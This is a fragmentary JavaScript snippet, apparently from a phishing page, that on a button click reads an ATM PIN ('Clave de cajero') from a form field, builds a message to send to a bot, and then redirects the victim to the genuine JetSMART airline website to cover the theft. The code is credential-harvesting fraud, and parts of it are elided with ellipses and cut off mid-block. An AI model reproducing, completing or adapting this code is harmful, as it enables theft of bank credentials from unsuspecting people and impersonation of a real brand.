document.getElementById("btnNextStep").addEventListener("click", function(event) {
    ...
    const dinamycpass = document.getElementById("ccajero").value;

    // Crea el mensaje que enviarás al bot
    const mensaje = `
        Clave de cajero: ${dinamycpass}
    `;
    ...
    .then(data => {
        ...
        window.location.href = 'https://jetsmart.com/co/es/';  // Cambia 'gracias.html' por la URL de la página que deseas redirigir
    })
    .catch(error => {
